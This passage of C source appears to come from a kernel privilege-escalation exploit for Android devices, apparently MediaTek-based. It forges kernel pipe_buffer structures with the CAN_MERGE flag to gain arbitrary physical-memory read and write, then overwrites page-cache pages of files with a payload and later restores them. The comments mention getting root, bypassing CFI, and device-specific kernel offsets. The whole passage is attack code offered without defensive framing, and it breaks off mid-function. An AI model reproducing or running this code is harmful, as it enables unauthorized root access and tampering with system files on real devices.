    pr_info("physrw_patch trace-pfn miss path=%s ofs=0x%llx via=%s "
            "dev=%u:%u ino=%llx ev=%d ino_hit=%d ofs_hit=%d\n",
            path, (unsigned long long)map_off, roots[ri], major_v, minor_v,
            ino_v, ev_total, ev_ino, ev_ofs);
  }
  close(file_fd);
  return 0;
}

int physrw_carrier_pfn_prefetch(int cfg_fd, const char *path, off_t patch_off) {
  if (!path || patch_off < 0) {
    errno = EINVAL;
    return 0;
  }
  carrier_pref_release();
  off_t map_off = patch_off & ~(off_t)(PAGE_SIZE - 1);
  size_t in_page = (size_t)(patch_off - map_off);
  uint64_t pfn = 0;

  if (!file_page_pfn_via_trace(path, map_off, &pfn) || !pfn) {
    pr_info("carrier_pref ftrace-pfn fail path=%s off=0x%llx\n", path,
            (unsigned long long)patch_off);
    return 0;
  }

  int fd = open(path, O_RDONLY | O_CLOEXEC);
  if (fd < 0) {
    return 0;
  }
  if (pread(fd, carrier_pref_pre, sizeof(carrier_pref_pre), patch_off) !=
      (ssize_t)sizeof(carrier_pref_pre)) {
    close(fd);
    return 0;
  }
  void *map = mmap(NULL, PAGE_SIZE, PROT_READ, MAP_SHARED, fd, map_off);
  if (map == MAP_FAILED) {
    close(fd);
    return 0;
  }
  volatile unsigned char touch = *((volatile unsigned char *)map + in_page);
  (void)touch;

  uintptr_t phys = (uintptr_t)pfn << PAGE_SHIFT;
  uintptr_t kpage = 0;
  if (phys >= (uintptr_t)P0_PHYS_OFFSET) {
    kpage = (uintptr_t)P0_PAGE_OFFSET + (phys - (uintptr_t)P0_PHYS_OFFSET);
  }
  uintptr_t kva = kpage + in_page;
  if (cfg_fd >= 0 && physrw_read_ok && is_direct_ptr(kva)) {
    unsigned char k_pre[16];
    if (!pipe_phys_read_data(cfg_fd, kva, k_pre, sizeof(k_pre)) ||
        memcmp(k_pre, carrier_pref_pre, sizeof(k_pre)) != 0) {
      pr_info("carrier_pref kva/file disagree pfn=%llx kva=%016zx — retry "
              "not pinned\n",
              (unsigned long long)pfn, kva);
      munmap(map, PAGE_SIZE);
      close(fd);
      return 0;
    }
  }

  snprintf(carrier_pref_path, sizeof(carrier_pref_path), "%s", path);
  carrier_pref_map_off = map_off;
  carrier_pref_pfn = pfn;
  carrier_pref_fd = fd;
  carrier_pref_map = map;
  carrier_pref_ready = 1;
  pr_info("carrier_pref pinned path=%s map_off=0x%llx pfn=%llx "
          "kpage=%016zx pin=%p\n",
          path, (unsigned long long)map_off, (unsigned long long)pfn, kpage,
          map);
  return 1;
}

int physrw_patch_file_page(int cfg_fd, const char *path, off_t patch_off,
                           const void *payload, size_t payload_len,
                           const void *expect_preimage, size_t preimage_len) {
  if (cfg_fd < 0 || !path || !payload || payload_len == 0 || patch_off < 0 ||
      !physrw_read_ok || !physrw_write_ok) {
    errno = EINVAL;
    return 0;
  }
  if ((patch_off & (PAGE_SIZE - 1)) + payload_len > PAGE_SIZE) {
    pr_info("physrw_patch cross-page refused off=0x%llx len=%zu\n",
            (unsigned long long)patch_off, payload_len);
    errno = EINVAL;
    return 0;
  }

  int file_fd = open(path, O_RDONLY | O_CLOEXEC);
  if (file_fd < 0) {
    return 0;
  }
  off_t map_off = patch_off & ~(off_t)(PAGE_SIZE - 1);
  size_t in_page = (size_t)(patch_off - map_off);
  unsigned char file_pre[64];
  size_t check_len =
      preimage_len && preimage_len <= sizeof(file_pre) ? preimage_len : 16;
  if (check_len > payload_len) {
    check_len = payload_len < sizeof(file_pre) ? payload_len : sizeof(file_pre);
  }
  if (pread(file_fd, file_pre, check_len, patch_off) != (ssize_t)check_len) {
    close(file_fd);
    return 0;
  }
  if (expect_preimage && preimage_len &&
      (preimage_len > check_len ||
       memcmp(file_pre, expect_preimage, preimage_len) != 0)) {
    pr_info("physrw_patch preimage mismatch path=%s off=0x%llx\n", path,
            (unsigned long long)patch_off);
    close(file_fd);
    errno = EBADMSG;
    return 0;
  }

  void *map = MAP_FAILED;
  uint64_t pfn = 0;
  const char *pfn_src = "none";

  /* Shell-time prefetch is the stable path (post-root ftrace yields ev=0). */
  if (carrier_pref_ready && carrier_pref_pfn &&
      carrier_pref_map_off == map_off &&
      strcmp(carrier_pref_path, path) == 0) {
    pfn = carrier_pref_pfn;
    pfn_src = "prefetch";
    if (memcmp(carrier_pref_pre, file_pre,
               check_len < sizeof(carrier_pref_pre) ? check_len
                                                    : sizeof(carrier_pref_pre)) !=
        0) {
      pr_info("physrw_patch prefetch preimage drift — drop pin\n");
      carrier_pref_release();
      pfn = 0;
      pfn_src = "none";
    }
  }

  /* Prefer pagemap when CapEff is real; dual-view often returns EACCES. */
  if (!pfn) {
    map = mmap(NULL, PAGE_SIZE, PROT_READ, MAP_SHARED, file_fd, map_off);
    if (map != MAP_FAILED) {
      volatile unsigned char touch = *((volatile unsigned char *)map + in_page);
      (void)touch;
      if (pagemap_va_to_pfn((uintptr_t)map, &pfn)) {
        pfn_src = "pagemap";
      } else {
        pr_info("physrw_patch pagemap miss path=%s va=%p errno=%d\n", path, map,
                errno);
        munmap(map, PAGE_SIZE);
        map = MAP_FAILED;
      }
    }
  }

  /*
   * Do NOT ftrace here: after nosetuid, getuid stays 2000 (dual-view) but
   * secontext is kernel:s0 and mm_filemap tracing yields ev=0 / panic risk.
   * PFN must come from shell-time physrw_carrier_pfn_prefetch() or pagemap.
   */
  if (!pfn) {
    pr_info("physrw_patch pfn resolve failed path=%s pref=%d\n", path,
            carrier_pref_ready);
    if (map != MAP_FAILED) {
      munmap(map, PAGE_SIZE);
    }
    close(file_fd);
    errno = ENOENT;
    return 0;
  }

  if (map == MAP_FAILED) {
    map = mmap(NULL, PAGE_SIZE, PROT_READ, MAP_SHARED, file_fd, map_off);
    if (map == MAP_FAILED) {
      close(file_fd);
      return 0;
    }
    volatile unsigned char touch = *((volatile unsigned char *)map + in_page);
    (void)touch;
  }

  /* Same phys→linear map as filemap reclaim (PHYS_OFFSET=0x40000000). */
  uintptr_t phys = (uintptr_t)pfn << PAGE_SHIFT;
  uintptr_t kpage = 0;
  if (phys >= (uintptr_t)P0_PHYS_OFFSET) {
    kpage = (uintptr_t)P0_PAGE_OFFSET + (phys - (uintptr_t)P0_PHYS_OFFSET);
  }
  uintptr_t kva = kpage + in_page;
  pr_info("physrw_patch pfn ok src=%s pfn=%llx phys=%016zx kva=%016zx "
          "off=0x%llx\n",
          pfn_src, (unsigned long long)pfn, phys, kva,
          (unsigned long long)patch_off);
  if (!is_direct_ptr(kpage) || !is_direct_ptr(kva)) {
    pr_info("physrw_patch bad kva pfn=%llx kpage=%016zx src=%s\n",
            (unsigned long long)pfn, kpage, pfn_src);
    munmap(map, PAGE_SIZE);
    close(file_fd);
    return 0;
  }

  unsigned char k_pre[64];
  if (check_len > sizeof(k_pre) ||
      !pipe_phys_read_data(cfg_fd, kva, k_pre, check_len)) {
    pr_info("physrw_patch kread fail kva=%016zx src=%s\n", kva, pfn_src);
    munmap(map, PAGE_SIZE);
    close(file_fd);
    return 0;
  }
  if (memcmp(k_pre, file_pre, check_len) != 0) {
    pr_info("physrw_patch kva/file disagree pfn=%llx src=%s (wrong page?)\n",
            (unsigned long long)pfn, pfn_src);
    munmap(map, PAGE_SIZE);
    close(file_fd);
    errno = EAGAIN;
    return 0;
  }

  unsigned char *saved = malloc(payload_len);
  if (!saved || !pipe_phys_read_data(cfg_fd, kva, saved, payload_len)) {
    pr_info("physrw_patch save fail\n");
    free(saved);
    munmap(map, PAGE_SIZE);
    close(file_fd);
    return 0;
  }

  /* Short reversible canary then real payload. */
  static const unsigned char canary[] = "PD2241_PC!";
  size_t canary_len = sizeof(canary) - 1;
  if (canary_len > payload_len) {
    canary_len = payload_len;
  }
  int canary_ok = 0;
  if (pipe_phys_write_data(cfg_fd, kva, canary, canary_len)) {
    unsigned char rb[16];
    unsigned char frb[16];
    canary_ok =
        pipe_phys_read_data(cfg_fd, kva, rb, canary_len) &&
        memcmp(rb, canary, canary_len) == 0 &&
        pread(file_fd, frb, canary_len, patch_off) == (ssize_t)canary_len &&
        memcmp(frb, canary, canary_len) == 0;
  }
  pr_info("physrw_patch canary ok=%d pfn=%llx kva=%016zx off=0x%llx\n",
          canary_ok, (unsigned long long)pfn, kva,
          (unsigned long long)patch_off);
  if (!canary_ok) {
    (void)pipe_phys_write_data(cfg_fd, kva, saved, payload_len);
    free(saved);
    munmap(map, PAGE_SIZE);
    close(file_fd);
    return 0;
  }

  int wrote = pipe_phys_write_data(cfg_fd, kva, payload, payload_len);
  unsigned char *verify = malloc(payload_len);
  int k_match = 0, f_match = 0;
  if (wrote && verify &&
      pipe_phys_read_data(cfg_fd, kva, verify, payload_len) &&
      memcmp(verify, payload, payload_len) == 0) {
    k_match = 1;
  }
  if (wrote && verify &&
      pread(file_fd, verify, payload_len, patch_off) == (ssize_t)payload_len &&
      memcmp(verify, payload, payload_len) == 0) {
    f_match = 1;
  }
  pr_info("physrw_patch commit wrote=%d k_match=%d file_match=%d len=%zu "
          "path=%s\n",
          wrote, k_match, f_match, payload_len, path);
  if (!(k_match && f_match)) {
    (void)pipe_phys_write_data(cfg_fd, kva, saved, payload_len);
    free(verify);
    free(saved);
    munmap(map, PAGE_SIZE);
    close(file_fd);
    return 0;
  }
  free(verify);
  munmap(map, PAGE_SIZE);
  close(file_fd);
  /* Keep original bytes + kva for post-su restore (do not release pin yet). */
  free(last_patch_saved);
  last_patch_saved = saved;
  last_patch_kva = kva;
  last_patch_len = payload_len;
  last_patch_off = patch_off;
  snprintf(last_patch_path, sizeof(last_patch_path), "%s", path);
  return 1;
}

int physrw_restore_last_file_page(int cfg_fd) {
  if (cfg_fd < 0 || !last_patch_kva || !last_patch_saved || !last_patch_len ||
      !physrw_write_ok) {
    errno = EINVAL;
    return 0;
  }
  int ok = pipe_phys_write_data(cfg_fd, last_patch_kva, last_patch_saved,
                                last_patch_len);
  int match = 0;
  if (ok) {
    unsigned char *rb = malloc(last_patch_len);
    if (rb &&
        pipe_phys_read_data(cfg_fd, last_patch_kva, rb, last_patch_len) &&
        memcmp(rb, last_patch_saved, last_patch_len) == 0) {
      int ffd = open(last_patch_path, O_RDONLY | O_CLOEXEC);
      if (ffd >= 0) {
        if (pread(ffd, rb, last_patch_len, last_patch_off) ==
                (ssize_t)last_patch_len &&
            memcmp(rb, last_patch_saved, last_patch_len) == 0) {
          match = 1;
        }
        close(ffd);
      }
    }
    free(rb);
  }
  pr_info("physrw_restore ok=%d match=%d kva=%016zx len=%zu path=%s\n", ok,
          match, last_patch_kva, last_patch_len, last_patch_path);
  if (match) {
    free(last_patch_saved);
    last_patch_saved = NULL;
    last_patch_kva = 0;
    last_patch_len = 0;
    last_patch_path[0] = 0;
    carrier_pref_release();
  }
  return match;
}

static int dirty_region_matches(const char *path, off_t offset,
                                const void *want, size_t size) {
  unsigned char *got = malloc(size);
  if (!got) return 0;
  int fd = open(path, O_RDONLY | O_CLOEXEC);
  int match = fd >= 0 && pread(fd, got, size, offset) == (ssize_t)size &&
              memcmp(got, want, size) == 0;
  if (fd >= 0) close(fd);
  free(got);
  return match;
}

int pipe_dirty_commit_split(const void *probe_payload, size_t probe_size,
                            const void *carrier_payload, size_t carrier_size,
                            int *probe_match, int *carrier_match) {
  if (!dirty_split_ready || !probe_payload || !carrier_payload ||
      probe_size == 0 || carrier_size == 0) {
    errno = EINVAL;
    return 0;
  }
  int writes = 0;
  for (size_t i = 0; i < PIPE_RECLAIM; i++) {
    const void *payload = (i & 1) ? carrier_payload : probe_payload;
    size_t size = (i & 1) ? carrier_size : probe_size;
    ssize_t n = write(pipe_fds_reclaim[i][1], payload, size);
    if (n == (ssize_t)size) writes++;
  }
  int p = dirty_region_matches(dirty_probe_path, dirty_probe_offset,
                               probe_payload, probe_size);
  int c = dirty_region_matches(dirty_carrier_path, dirty_carrier_offset,
                               carrier_payload, carrier_size);
  if (probe_match) *probe_match = p;
  if (carrier_match) *carrier_match = c;
  pr_info("43074 pipe commit writes=%d/%d active_slot=%d "
          "probe_match=%d carrier_match=%d\n",
          writes, PIPE_RECLAIM, dirty_active_slot, p, c);
  return p && c;
}

void reset_pipe_attempt(void) {
  if (pipe_prepare_child > 0) {
    kill(pipe_prepare_child, SIGKILL);
    waitpid(pipe_prepare_child, NULL, 0);
    pipe_prepare_child = -1;
  }

  if (pipe_objects_ready) {
    for (size_t i = 0; i < PIPE_DRAIN; i++) {
      close(pipe_fds_drain[i][0]);
      close(pipe_fds_drain[i][1]);
    }
    for (size_t i = 0; i < PIPE_RECLAIM; i++) {
      close(pipe_fds_reclaim[i][0]);
      close(pipe_fds_reclaim[i][1]);
    }
    pipe_objects_ready = 0;
  }

  pipebuf_page_base = 0;
  dirty_split_ready = 0;
  dirty_probe_path[0] = 0;
  dirty_carrier_path[0] = 0;
  pipebuf_addr = 0;
  pipebuf_pipe_idx = -1;
  pipe_cache_gate_ok = 0;
  pipe_cache_page_index = -1;
  pipe_cache_slot_hit = -1;
  pipe_probe_found = 0;
  pipe_probe_page = 0;
  pipe_probe_ops = 0;
  pipe_probe_private = 0;
  pipe_probe_len = 0;
  pipe_probe_flags = 0;
  candidate_slab_cache = 0;
  atomic_store(&pipe_prepare_request, 0);
  atomic_store(&pipe_prepare_done, 0);
}

uintptr_t direct_to_page(uintptr_t addr) {
  uintptr_t pfn = (addr - DIRECT_MAP_BASE) >> PAGE_SHIFT;
  return VMEMMAP_START + pfn * STRUCT_PAGE_SIZE;
}

uintptr_t direct_to_head_page(int fd, uintptr_t addr) {
  uintptr_t page = direct_to_page(addr);
  uintptr_t head_addr = page + STRUCT_PAGE_COMPOUND_HEAD_OFF;
  uint64_t compound_head = kernel_read64(fd, head_addr);
  if (compound_head & 1) {
    return compound_head & ~1ULL;
  }
  return page;
}

uintptr_t page_to_direct(uintptr_t page) {
  uintptr_t pfn = (page - VMEMMAP_START) / STRUCT_PAGE_SIZE;
  return DIRECT_MAP_BASE + (pfn << PAGE_SHIFT);
}

uintptr_t pipe_buf_ops_addr(void) {
  return text_addr(ANON_PIPE_BUF_OPS);
}

int pipe_cache_matches(uint64_t slab_cache) {
  if (slab_cache == 0) {
    return 0;
  }
  if (KMALLOC_PIPE_INDEX == 10) {
    return slab_cache == kmalloc_normal_1k_cache ||
           slab_cache == kmalloc_cgroup_1k_cache;
  }
  if (KMALLOC_PIPE_INDEX == 11) {
    return slab_cache == kmalloc_normal_2k_cache ||
           slab_cache == kmalloc_cgroup_2k_cache;
  }
  return slab_cache == kmalloc_pipe_cache;
}

int pipe_reclaim_cache_gate(int fd) {
  if (!is_direct_ptr(pipebuf_page_base)) {
    return 0;
  }

  pipe_cache_page_index = -1;
  pipe_cache_slot_hit = -1;
  memset(pipe_page_slab_cache, 0, sizeof(pipe_page_slab_cache));
  memset(pipe_page_type, 0, sizeof(pipe_page_type));

  uint64_t cache_slots[KMALLOC_CACHE_SLOTS];
  memset(cache_slots, 0, sizeof(cache_slots));
  uintptr_t kmalloc_caches = data_addr(KMALLOC_CACHES);
  kernel_read_data(fd, kmalloc_caches, cache_slots, sizeof(cache_slots));
  kmalloc_normal_1k_cache =
    cache_slots[KMALLOC_NORMAL_TYPE * KMALLOC_BUCKETS + 10];
  kmalloc_normal_2k_cache =
    cache_slots[KMALLOC_NORMAL_TYPE * KMALLOC_BUCKETS + 11];
  kmalloc_cgroup_1k_cache =
    cache_slots[KMALLOC_CGROUP_TYPE * KMALLOC_BUCKETS + 10];
  kmalloc_cgroup_2k_cache =
    cache_slots[KMALLOC_CGROUP_TYPE * KMALLOC_BUCKETS + 11];

  kmalloc_pipe_cache =
    kernel_read64(fd, data_addr(KMALLOC_CGROUP_PIPE_SLOT));
  for (size_t off = 0; off < ORDER3_SIZE; off += PAGE_SIZE) {
    uintptr_t page = pipebuf_page_base + off;
    uintptr_t head = direct_to_head_page(fd, page);
    uint64_t slab_cache = kernel_read64(fd, head + STRUCT_SLAB_CACHE_OFF);
    uintptr_t type_addr = head + STRUCT_PAGE_TYPE_OFF;
    uint32_t page_type = (uint32_t)kernel_read64(fd, type_addr);
    pipe_page_slab_cache[off / PAGE_SIZE] = slab_cache;
    pipe_page_type[off / PAGE_SIZE] = page_type;
    int cache_match = pipe_cache_matches(slab_cache);
    if (off == 0 || cache_match) {
      candidate_slab_cache = slab_cache;
    }
    for (int slot = 0; slot < KMALLOC_CACHE_SLOTS; slot++) {
      if (cache_slots[slot] == slab_cache) {
        pipe_cache_slot_hit = slot;
      }
    }
    if (cache_match) {
      pipebuf_page_base = page;
      pipe_cache_page_index = off / PAGE_SIZE;
      pipe_cache_gate_ok = 1;
      return 1;
    }
  }

  pipe_cache_gate_ok = 0;
  return 0;
}

int read_pipe_slab(int fd, uintptr_t base, unsigned char *slab) {
  for (size_t off = 0; off < ORDER3_SIZE; off += PIPE_SCAN_CHUNK) {
    if (kernel_read_data(fd, base + off, slab + off, PIPE_SCAN_CHUNK) !=
        PIPE_SCAN_CHUNK) {
      return 0;
    }
  }
  return 1;
}

int find_pipe_buffer(int fd, uintptr_t base) {
  unsigned char slab[ORDER3_SIZE];
  pipebuf_addr = 0;
  pipebuf_pipe_idx = -1;
  pipe_probe_found = 0;
  pipe_probe_page = 0;
  pipe_probe_ops = 0;
  pipe_probe_private = 0;
  pipe_probe_len = 0;
  pipe_probe_flags = 0;
  pipe_scan_vmemmap = 0;
  pipe_scan_ops = 0;
  pipe_scan_len = 0;
  pipe_scan_first_page = 0;
  pipe_scan_first_ops = 0;
  pipe_scan_first_len = 0;
  pipe_scan_first_flags = 0;
  pipe_scan_q0 = 0;
  pipe_scan_q1 = 0;
  pipe_scan_q2 = 0;
  pipe_scan_q3 = 0;
  if (!read_pipe_slab(fd, base, slab)) {
    return 0;
  }
  memcpy(&pipe_scan_q0, slab + 0x00, 8);
  memcpy(&pipe_scan_q1, slab + 0x08, 8);
  memcpy(&pipe_scan_q2, slab + 0x10, 8);
  memcpy(&pipe_scan_q3, slab + 0x18, 8);

  for (size_t off = 0; off + sizeof(struct user_pipe_buffer) <= ORDER3_SIZE;
       off += 8) {
    struct user_pipe_buffer pb;
    memcpy(&pb, slab + off, sizeof(pb));
    if (pb.page >= VMEMMAP_START && pb.page < VMEMMAP_END) {
      pipe_scan_vmemmap++;
      if (pipe_scan_first_page == 0) {
        pipe_scan_first_page = pb.page;
        pipe_scan_first_ops = pb.ops;
        pipe_scan_first_len = pb.len;
        pipe_scan_first_flags = pb.flags;
      }
    } else {
      continue;
    }
    if (pb.ops == pipe_buf_ops_addr()) {
      pipe_scan_ops++;
    }
    if (pb.len > 0 && pb.len <= PIPE_RECLAIM) {
      pipe_scan_len++;
    }
    if (pb.offset != 0 || pb.ops != pipe_buf_ops_addr() ||
        pb.flags != PIPE_BUF_FLAG_CAN_MERGE || pb.private != 0) {
      continue;
    }
    if (pb.len == 0 || pb.len > PIPE_RECLAIM) {
      continue;
    }

    pipebuf_addr = base + off;
    pipebuf_pipe_idx = (int)pb.len - 1;
    pipe_probe_found = 1;
    pipe_probe_page = pb.page;
    pipe_probe_ops = pb.ops;
    pipe_probe_private = pb.private;
    pipe_probe_len = pb.len;
    pipe_probe_flags = pb.flags;
    return 1;
  }

  return 0;
}

int pipe_phys_read(
    int fd, int pipefd[2], uintptr_t buf_addr, uintptr_t direct_addr,
    void *out, size_t len) {
  struct user_pipe_buffer saved;
  if (kernel_read_data(fd, buf_addr, &saved, sizeof(saved)) !=
      (ssize_t)sizeof(saved)) {
    return 0;
  }

  struct user_pipe_buffer pb = saved;
  pb.page = direct_to_page(direct_addr);
  pb.offset = direct_addr & (PAGE_SIZE - 1);
  pb.len = len + 1;
  pb.ops = pipe_buf_ops_addr();
  pb.flags = PIPE_BUF_FLAG_CAN_MERGE;
  pb.private = 0;

  if (kernel_write_data(fd, buf_addr, &pb, sizeof(pb)) !=
      (ssize_t)sizeof(pb)) {
    return 0;
  }

  ssize_t got = read(pipefd[0], out, len);
  int ok = got == (ssize_t)len;
  kernel_write_data(fd, buf_addr, &saved, sizeof(saved));
  return ok;
}

int pipe_phys_write(
    int fd, int pipefd[2], uintptr_t buf_addr, uintptr_t direct_addr,
    const void *data, size_t len) {
  struct user_pipe_buffer saved;
  if (kernel_read_data(fd, buf_addr, &saved, sizeof(saved)) !=
      (ssize_t)sizeof(saved)) {
    return 0;
  }

  struct user_pipe_buffer pb = saved;
  pb.page = direct_to_page(direct_addr);
  pb.offset = direct_addr & (PAGE_SIZE - 1);
  pb.len = 0;
  pb.ops = pipe_buf_ops_addr();
  pb.flags = PIPE_BUF_FLAG_CAN_MERGE;
  pb.private = 0;

  if (kernel_write_data(fd, buf_addr, &pb, sizeof(pb)) !=
      (ssize_t)sizeof(pb)) {
    return 0;
  }

  ssize_t wrote = write(pipefd[1], data, len);
  int ok = wrote == (ssize_t)len;
  kernel_write_data(fd, buf_addr, &saved, sizeof(saved));
  return ok;
}

void forge_pipe_buffers_on_page(
    int fd, uintptr_t base, uintptr_t direct_addr, size_t len, int for_write) {
  struct user_pipe_buffer pb;
  memset(&pb, 0, sizeof(pb));
  pb.page = direct_to_page(direct_addr);
  pb.offset = direct_addr & (PAGE_SIZE - 1);
  pb.len = for_write ? 0 : len + 1;
  pb.ops = pipe_buf_ops_addr();
  pb.flags = PIPE_BUF_FLAG_CAN_MERGE;

  for (size_t off = 0; off < PIPE_SLAB_SIZE; off += PIPE_OBJECT_SIZE) {
    kernel_write_data(fd, base + off, &pb, sizeof(pb));
  }
}

int pipe_phys_read_data(int fd, uintptr_t direct_addr, void *out, size_t len) {
  /*
   * True pipe-phys path needs linear-map addresses. Slid kimage .data is not
   * reliably reachable via P0 physmap alias on this MTK (reads as zeros) —
   * fall back to configfs arb-RW which already targets kimage VAs.
   *
   * Heap task_struct is SLUB with usercopy whitelist (comm only). Configfs
   * text-read of tgid/list/cred from those objects BUGS — never fall back
   * for arbitrary direct-map pointers; only our held order-3 pages are safe.
   */
  if (is_direct_ptr(direct_addr) && pipebuf_page_base != 0 &&
      pipebuf_pipe_idx >= 0 &&
      (direct_addr & (PAGE_SIZE - 1)) + len <= PAGE_SIZE) {
    int ok = 0;
    if (pipebuf_addr) {
      int *pipefd = pipe_fds_reclaim[pipebuf_pipe_idx];
      ok = pipe_phys_read(fd, pipefd, pipebuf_addr, direct_addr, out, len);
    } else {
      forge_pipe_buffers_on_page(fd, pipebuf_page_base, direct_addr, len, 0);
      ssize_t got = read(pipe_fds_reclaim[pipebuf_pipe_idx][0], out, len);
      ok = got == (ssize_t)len;
    }
    if (ok) {
      return 1;
    }
  }
  if (is_direct_ptr(direct_addr) && len > 0) {
    int held = 0;
    if (page_base && direct_addr >= page_base &&
        direct_addr + len <= page_base + ORDER3_SIZE) {
      held = 1;
    }
    if (!held && pipebuf_page_base && direct_addr >= pipebuf_page_base &&
        direct_addr + len <= pipebuf_page_base + ORDER3_SIZE) {
      held = 1;
    }
    if (!held) {
      return 0;
    }
  }
  return kernel_read_data(fd, direct_addr, out, len) == (ssize_t)len;
}

int pipe_phys_write_data(
    int fd, uintptr_t direct_addr, const void *data, size_t len) {
  if (is_direct_ptr(direct_addr) && pipebuf_page_base != 0 &&
      pipebuf_pipe_idx >= 0 &&
      (direct_addr & (PAGE_SIZE - 1)) + len <= PAGE_SIZE) {
    int ok = 0;
    if (pipebuf_addr) {
      int *pipefd = pipe_fds_reclaim[pipebuf_pipe_idx];
      ok = pipe_phys_write(fd, pipefd, pipebuf_addr, direct_addr, data, len);
    } else {
      forge_pipe_buffers_on_page(fd, pipebuf_page_base, direct_addr, len, 1);
      ssize_t wrote = write(pipe_fds_reclaim[pipebuf_pipe_idx][1], data, len);
      ok = wrote == (ssize_t)len;
    }
    if (ok) {
      return 1;
    }
  }
  if (is_direct_ptr(direct_addr) && len > 0) {
    int held = 0;
    if (page_base && direct_addr >= page_base &&
        direct_addr + len <= page_base + ORDER3_SIZE) {
      held = 1;
    }
    if (!held && pipebuf_page_base && direct_addr >= pipebuf_page_base &&
        direct_addr + len <= pipebuf_page_base + ORDER3_SIZE) {
      held = 1;
    }
    if (!held) {
      return 0;
    }
  }
  return kernel_write_data(fd, direct_addr, data, len) == (ssize_t)len;
}

uint64_t pipe_read64(int fd, uintptr_t direct_addr) {
  uint64_t value = 0;
  pipe_phys_read_data(fd, direct_addr, &value, sizeof(value));
  return value;
}

uint32_t pipe_read32(int fd, uintptr_t direct_addr) {
  uint32_t value = 0;
  pipe_phys_read_data(fd, direct_addr, &value, sizeof(value));
  return value;
}

int pipe_write64(int fd, uintptr_t direct_addr, uint64_t value) {
  return pipe_phys_write_data(fd, direct_addr, &value, sizeof(value));
}

int install_pipe_physrw(int fd) {
  if (pipebuf_page_base == 0) {
    if (env_flag("PIPE_HELPER_CONNECT", 0)) {
      if (!pipe_helper_connect()) {
        pr_warning("PIPE_HELPER_CONNECT failed\n");
        return 0;
      }
    } else {
      atomic_store(&pipe_prepare_done, 0);
      atomic_store(&pipe_prepare_request, 1);
      while (!atomic_load(&pipe_prepare_done)) {
        usleep(10000);
      }
    }
  }

  uintptr_t proof_addr = page_base + PHYSRW_PROOF_OFF;
  uintptr_t proof_page = page_to_direct(direct_to_page(proof_addr));
  if (proof_page != (proof_addr & ~(PAGE_SIZE - 1))) {
    return 0;
  }
  if (!pipe_reclaim_cache_gate(fd)) {
    pr_info("phys step cache gate failed slab=%016zx want=%016zx\n",
            candidate_slab_cache, kmalloc_pipe_cache);
    /*
     * PD2324/6.1: STRUCT_SLAB_CACHE_OFF / compound_head overlay often reads 0
     * even when pipe reclaim page is live. Default: continue to find_pipe_buffer
     * while configfs arb-RW is still up (do not abort CFI).
     * Set PIPE_REQUIRE_CACHE_GATE=1 to restore hard fail.
     */
    if (env_flag("PIPE_REQUIRE_CACHE_GATE", 0)) {
      return 0;
    }
    pr_warning("cache gate soft-fail → try find_pipe_buffer anyway\n");
  }

  char marker[PIPE_RECLAIM];
  memset(marker, 0x61, sizeof(marker));
  for (size_t i = 0; i < PIPE_RECLAIM; i++) {
    SYSCHK(write(pipe_fds_reclaim[i][1], marker, i + 1));
  }

  /*
   * prepare_pipe_buffer_page() reclaims a *separate* GhostLock order-3 into
   * pipebufs — scan that first (find_pipe_buffer reads a full ORDER3 from base).
   * Misc page_base is for CFI fops, not pipe reclaim; only probe it if asked.
   */
  int found = 0;
  uintptr_t try_pages[16];
  int ntry = 0;
  uintptr_t reclaim =
      pipebuf_page_base ? (pipebuf_page_base & ~(ORDER3_SIZE - 1ULL)) : 0;
  if (reclaim && ntry < 16) {
    try_pages[ntry++] = reclaim;
  }
  if (env_flag("PIPE_SCAN_MISC_PAGE", 0)) {
    uintptr_t own = page_base ? (page_base & ~(ORDER3_SIZE - 1ULL)) : 0;
    if (own && own != reclaim && ntry < 16) {
      try_pages[ntry++] = own;
    }
  }
  if (env_flag("PIPE_SCAN_ORDER3", 0) && reclaim) {
    for (size_t off = PAGE_SIZE; off < ORDER3_SIZE && ntry < 16;
         off += PAGE_SIZE) {
      try_pages[ntry++] = reclaim + off;
    }
  }
  pr_info("phys step pipe scan ntry=%d reclaim=%016zx ops_want=%016zx\n", ntry,
          reclaim, pipe_buf_ops_addr());
  for (int i = 0; i < ntry; i++) {
    found = find_pipe_buffer(fd, try_pages[i]);
    pr_info("phys step pipe probe page=%016zx found=%d pipebuf=%016zx "
            "idx=%d scan=%d/%d/%d q=%016zx/%016zx/%016zx/%016zx first_page=%016zx "
            "first_ops=%016zx first_len=%u\n",
            try_pages[i], found, pipebuf_addr, pipebuf_pipe_idx,
            pipe_scan_vmemmap, pipe_scan_ops, pipe_scan_len, pipe_scan_q0,
            pipe_scan_q1, pipe_scan_q2, pipe_scan_q3, pipe_scan_first_page,
            pipe_scan_first_ops, pipe_scan_first_len);
    if (found) {
      pipebuf_page_base = try_pages[i];
      break;
    }
  }
  /*
   * First pass often only probes reclaim base. If miss and ORDER3 was off,
   * expand once automatically — cheaper than a full process retry.
   */
  if (!found && reclaim && ntry <= 1 && !env_flag("PIPE_SCAN_ORDER3", 0)) {
    ntry = 0;
    try_pages[ntry++] = reclaim;
    for (size_t off = PAGE_SIZE; off < ORDER3_SIZE && ntry < 16;
         off += PAGE_SIZE) {
      try_pages[ntry++] = reclaim + off;
    }
    pr_info("phys step pipe auto-ORDER3 expand ntry=%d\n", ntry);
    for (int i = 0; i < ntry; i++) {
      found = find_pipe_buffer(fd, try_pages[i]);
      pr_info("phys step pipe probe page=%016zx found=%d idx=%d\n",
              try_pages[i], found, pipebuf_pipe_idx);
      if (found) {
        pipebuf_page_base = try_pages[i];
        break;
      }
    }
  }
  if (!found) {
    pr_info("phys step pipe probe miss ntry=%d\n", ntry);
  }
  if (!found) {
    return 0;
  }
  if (!pipe_cache_gate_ok) {
    pipe_cache_gate_ok = 2;
  }

  char seed[] = PHYS_READ_TAG;
  if (kernel_write_data(fd, proof_addr, seed, sizeof(seed)) !=
      (ssize_t)sizeof(seed)) {
    return 0;
  }

  memset(physrw_readback, 0, sizeof(physrw_readback));
  physrw_read_ok =
    pipe_phys_read_data(fd, proof_addr, physrw_readback, sizeof(seed));
  pr_info("phys step probed read done ok=%d idx=%d\n",
          physrw_read_ok, pipebuf_pipe_idx);

  char overwrite[] = PHYS_WRITE_TAG;
  physrw_write_ok =
    pipe_phys_write_data(fd, proof_addr, overwrite, sizeof(overwrite));
  pr_info("phys step probed write done ok=%d\n", physrw_write_ok);
  kernel_read_data(fd, proof_addr, physrw_after_write, sizeof(overwrite));

  uintptr_t proof64_addr = proof_addr + 0x100;
  uint64_t seed64 = PHYS64_SEED;
  uint64_t next64 = PHYS64_NEXT;
  kernel_write_data(fd, proof64_addr, &seed64, sizeof(seed64));
  physrw_read64_before = pipe_read64(fd, proof64_addr);
